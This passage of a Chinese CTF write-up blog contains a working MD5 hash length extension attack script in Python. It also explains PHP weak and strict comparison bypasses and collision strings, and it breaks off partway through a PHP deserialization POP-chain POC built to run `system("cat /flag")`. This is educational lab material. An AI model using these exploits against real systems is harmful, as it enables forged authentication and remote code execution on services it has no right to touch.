class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor, sin<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D = \<br>        (<span class="hljs-number">0x67452301</span>, <span class="hljs-number">0xefcdab89</span>, <span class="hljs-number">0x98badcfe</span>, <span class="hljs-number">0x10325476</span>)  <span class="hljs-comment"># initial values</span><br>        <span class="hljs-variable language_">self</span>.r: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>        [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">5</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>] * <span class="hljs-number">4</span> + \<br>        [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>] * <span class="hljs-number">4</span>  <span class="hljs-comment"># shift values</span><br>        <span class="hljs-variable language_">self</span>.k: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>        [floor(<span class="hljs-built_in">abs</span>(sin(i + <span class="hljs-number">1</span>)) * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>         <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]  <span class="hljs-comment"># constants</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_lrot</span>(<span class="hljs-params">self, x: <span class="hljs-built_in">int</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-comment"># left rotate</span><br>        <span class="hljs-keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="hljs-number">32</span> - n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, chunk: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># update the hash for a chunk of data (64 bytes)</span><br>        w = <span class="hljs-built_in">list</span>(unpack(<span class="hljs-string">&#x27;&lt;&#x27;</span>+<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>, chunk))<br>        a, b, c, d = <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                f = (b &amp; c) | ((~b) &amp; d)<br>                flag = i<br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">32</span>:<br>                f = (b &amp; d) | (c &amp; (~d))<br>                flag = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">48</span>:<br>                f = (b ^ c ^ d)<br>                flag = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">else</span>:<br>                f = c ^ (b | (~d))<br>                flag = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span><br><br>            tmp = b + \<br>            <span class="hljs-variable language_">self</span>._lrot((a + f + <span class="hljs-variable language_">self</span>.k[i] + w[flag])<br>                       &amp; <span class="hljs-number">0xffffffff</span>, <span class="hljs-variable language_">self</span>.r[i])<br>            a, b, c, d = d, tmp &amp; <span class="hljs-number">0xffffffff</span>, b, c<br><br>        <span class="hljs-variable language_">self</span>.A = (<span class="hljs-variable language_">self</span>.A + a) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.B = (<span class="hljs-variable language_">self</span>.B + b) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.C = (<span class="hljs-variable language_">self</span>.C + c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.D = (<span class="hljs-variable language_">self</span>.D + d) &amp; <span class="hljs-number">0xffffffff</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># extend the hash with a new message (padded)</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(msg) % <span class="hljs-number">64</span> == <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(msg), <span class="hljs-number">64</span>):<br>            <span class="hljs-variable language_">self</span>.update(msg[i:i + <span class="hljs-number">64</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># pad the message</span><br>        length = pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-built_in">len</span>(msg) * <span class="hljs-number">8</span>)<br><br>        msg += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        msg += <span class="hljs-string">b&#x27;\x00&#x27;</span> * ((<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(msg)) % <span class="hljs-number">64</span>)<br>        msg += length<br><br>        <span class="hljs-keyword">return</span> msg<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># return the hash</span><br>        <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;IIII&#x27;</span>, <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5</span>(<span class="hljs-params">test_string: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># (DEBUG function) verify the MD5 implementation</span><br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5 <span class="hljs-keyword">as</span> md5_hashlib<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_manual</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        md5 = MD5()<br>        md5.extend(md5.padding(msg))<br>        <span class="hljs-keyword">return</span> md5.digest()<br><br>    manual_result = md5_manual(test_string).<span class="hljs-built_in">hex</span>()<br>    hashlib_result = md5_hashlib(test_string).hexdigest()<br><br>    <span class="hljs-keyword">assert</span> manual_result == hashlib_result, <span class="hljs-string">&quot;Test failed!&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">message_len: <span class="hljs-built_in">int</span>, known_hash: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">           append_str: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>    <span class="hljs-comment"># MD5 extension attack</span><br>    md5 = MD5()<br><br>    previous_text = md5.padding(<span class="hljs-string">b&quot;*&quot;</span> * message_len)<br>    current_text = previous_text + append_str<br><br>    md5.A, md5.B, md5.C, md5.D = unpack(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(known_hash))<br>    md5.extend(md5.padding(current_text)[<span class="hljs-built_in">len</span>(previous_text):])<br><br>    <span class="hljs-keyword">return</span> current_text[message_len:], md5.digest().<span class="hljs-built_in">hex</span>()<br><br><br>    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    message_len = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known text length: &quot;</span>))<br>    known_hash = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known hash: &quot;</span>).strip()<br>    append_text = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attacking...&quot;</span>)<br><br>    extend_str, final_hash = attack(message_len, known_hash, append_text)<br><br>    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>    <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text:&quot;</span>, extend_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (Base64):&quot;</span>, b64encode(extend_str).decode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Final hash:&quot;</span>, final_hash)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637002573-3643aea4-d604-4191-863e-83f539374162.png"></p><p>把Final hash的值赋给md5 Extend text的值赋给name就可得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637180173-c55add0a-3b8a-48d4-8599-6267df59dcf7.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637193568-f060cf95-f3ad-43d2-bdda-59fc7f0d42a8.png"></p><h3 id="MD5的知识小结"><a href="#MD5的知识小结" class="headerlink" title="MD5的知识小结"></a>MD5的知识小结</h3><p>参考文章：<a href="https://blog.csdn.net/weixin_37730482/article/details/70258547?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226089B332-44EF-4773-94E0-5B2F2AE68ADD%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6089B332-44EF-4773-94E0-5B2F2AE68ADD&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-70258547-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=md5%E7%AE%80%E4%BB%8B&spm=1018.2226.3001.4187">链接</a> <a href="https://blog.csdn.net/qq_45290991/article/details/120400363?ops_request_misc=%257B%2522request%255Fid%2522%253A%252271EC1266-17C8-4610-9FAA-0B6DB465740C%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=71EC1266-17C8-4610-9FAA-0B6DB465740C&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-120400363-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB&spm=1018.2226.3001.4187">链接</a></p><h4 id="1、md5简介及特点"><a href="#1、md5简介及特点" class="headerlink" title="1、md5简介及特点"></a>1、md5简介及特点</h4><p>MD5英文全称“Message-Digest Algorithm 5”，翻译过来是“消息摘要算法5”，由MD2、MD3、MD4演变过来的，是一种单向加密算法，是不可逆的一种的加密方式。</p><p>特点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">压缩性：任意长度的数据，算出的MD5值长度都是固定的。<br><br>容易计算：从原数据计算出MD5值很容易。<br><br>抗修改性：对原数据进行任何改动，哪怕只修改<span class="hljs-number">1</span>个字节，所得到的MD5值都有很大区别。<br><br>强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。<br></code></pre></td></tr></table></figure><h4 id="2、md5的算法原理"><a href="#2、md5的算法原理" class="headerlink" title="2、md5的算法原理"></a>2、md5的算法原理</h4><p>对MD5算法简要的叙述可以为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><p>总体流程如下图所示， 表示第i个分组，每次的运算都由前一轮的128位结果值和第i块512bit值进行运算。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637620049-36843ded-0c3c-41e5-9ecf-0705cdd821e8.png"></p><h4 id="3、md5在ctf比赛中可利用的方法"><a href="#3、md5在ctf比赛中可利用的方法" class="headerlink" title="3、md5在ctf比赛中可利用的方法"></a>3、md5在ctf比赛中可利用的方法</h4><h5 id="在php中的弱相等和强相等的绕过"><a href="#在php中的弱相等和强相等的绕过" class="headerlink" title="在php中的弱相等和强相等的绕过"></a>在php中的弱相等和强相等的绕过</h5><h6 id="弱相等："><a href="#弱相等：" class="headerlink" title="弱相等："></a>弱相等：</h6><p>当遇到弱相等时 可利用0e绕过和数组绕过</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0e123</span>==<span class="hljs-number">0e456</span>  <span class="hljs-comment">//由于在php被认为时科学计数法所以二者都等于0</span><br>banana[]==apple[] <span class="hljs-comment">//由于数组在转化时都成null所以两者相等</span><br></code></pre></td></tr></table></figure><p>当遇到string且弱相等时 数组绕过就不能使用只能使用0e绕过！！！</p><h6 id="强相等："><a href="#强相等：" class="headerlink" title="强相等："></a>强相等：</h6><p>当遇到强相等时 常见的绕过方式是数组绕过</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">banana[]===apple[] <span class="hljs-comment">//由于数组在转化时都成null所以两者相等</span><br></code></pre></td></tr></table></figure><p>当遇到string且强相等时 数组绕过不能使用 但是由于md5值具有不唯一性</p><p>可能两个不同的字符串会有相同的md5值 所以我们可通过md5碰撞来绕过</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">banana=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br>apple= TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br><span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))<br></code></pre></td></tr></table></figure><p>找到真实的 MD5 值一致的内容, 我们可以使用 fastcoll 工具</p><p><a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">链接</a></p><h5 id="哈希长度拓展攻击"><a href="#哈希长度拓展攻击" class="headerlink" title="哈希长度拓展攻击"></a>哈希长度拓展攻击</h5><h6 id="什么是哈希长度拓展攻击"><a href="#什么是哈希长度拓展攻击" class="headerlink" title="什么是哈希长度拓展攻击"></a>什么是哈希长度拓展攻击</h6><p><font style="color:rgb(77, 77, 77);">哈希长度扩展攻击(hash lengthextensionattacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。次攻击适用于MD5和SHA-1等基于Merkle–Damgård构造的算法</font></p><h6 id="MD5扩展攻击介绍"><a href="#MD5扩展攻击介绍" class="headerlink" title="MD5扩展攻击介绍"></a><font style="color:rgb(79, 79, 79);">MD5扩展攻击介绍</font></h6><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648567225-87360a1b-2db2-46e1-ba55-b197d78c7428.jpeg"></p><p><font style="color:rgb(77, 77, 77);">我们需要了解以下几点md5加密过程：</font></p><p><font style="color:rgb(85, 86, 102);">1、MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算</font></p><p><font style="color:rgb(85, 86, 102);">2、关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。</font></p><p><font style="color:rgb(85, 86, 102);">3、MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量</font><font style="color:rgb(85, 86, 102);">。</font></p><p><font style="color:rgb(77, 77, 77);">举一个例子讲一下如何填充：比如字符串“Acker” </font><font style="color:rgb(78, 161, 219) !important;">十六进制</font><font style="color:rgb(77, 77, 77);">0x41636b6572这里与448模512不同余，需补位满足二进制长度位512的倍数，补位后的数据如下：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">此处补充：以十六进制表示一共是128个字符，十六进制每个字符能够转换成4位二进制，128*4&#x3D;512这就是一组，正好是512bit</font><font style="color:rgb(77, 77, 77);">。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648728768-3334b5f2-efcb-4544-9e74-1285ec7f2201.jpeg"></p><p><font style="color:rgb(77, 77, 77);">上图中的8是因为补位时二进制第一位要补1，那么1000转换成16进制就是8.后面都补上0.</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648747002-fe3bb4a2-74af-4142-8ad1-2e323ca3fcfc.jpeg"></p><p><font style="color:rgb(77, 77, 77);">填充数据最后8字节长度，Acker长度为5*8&#x3D;40bit，又因为0x28&#x3D;40所以16进制显示为28.</font></p><p><font style="color:rgb(77, 77, 77);">为什么数据会在左端：MD5中储存的都是小端方式，比如0x12345678，那么md5存储顺序就是0x78563412</font></p><h6 id="MD5拓展攻击演示"><a href="#MD5拓展攻击演示" class="headerlink" title="MD5拓展攻击演示"></a><font style="color:rgb(79, 79, 79);">MD5拓展攻击演示</font></h6><p><font style="color:rgb(77, 77, 77);">下图为加密流程图，可以更直观看清楚整个流程。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648811483-3d320796-f89a-46a5-99dc-d043f32dfba5.jpeg"></p><p><font style="color:rgb(77, 77, 77);">选一个字符串例如“Acker”MD5（“Acker”）&#x3D; dee2fb2df156f4040f893d8a10ac1034</font></p><p><font style="color:rgb(77, 77, 77);">现在我们不需要知道字符串是什么。只需要知道其长度，并将字符串填充完，新加一个字符串如：addition，之前得到的“Acker”MD5值作为最后一块加密的初始向量，最后得到的结果和MD5（“Acker+addition”）是一样的。</font></p><p><font style="color:rgb(77, 77, 77);">题目中的md5&#x3D;md5(random+name)也是同样的原理</font></p><h2 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;echo 123;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$nature</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">思考怎么构建这个pop链 而这道题在类名上就已经有了非常明显的提示了：Nature-&gt;sea-&gt;shark-&gt;sink</font></p><p><font style="color:rgb(77, 77, 77);">然后我们根据代码理清思路是Nature: __destruct() —&gt; Sea: __get() —&gt; Shark: __invoke() —&gt; Sink: __toString() —&gt; RCE。但是这里要注意的一点就是，这道题中有private属性的成员，那么有些是不可在外部更改的，那么我们就需要在内部修改或者在内部写一个函数使我们能在外部修改。（例如这里的0Shark\0word代表shark里的私有属性word；0Sink\0cmd就代表sink里的私有属性cmd）</font></p><p><font style="color:rgb(77, 77, 77);">POC</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span>;<br><span class="hljs-comment">//存在 private 字段, 由于 php 版本低于 7.1+, 所以我们需要保留好他的访问性</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setWord</span>(<span class="hljs-params"><span class="hljs-variable">$word</span></span>) //关键, 控制到<span class="hljs-title">word</span>的值</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;word = <span class="hljs-variable">$word</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span 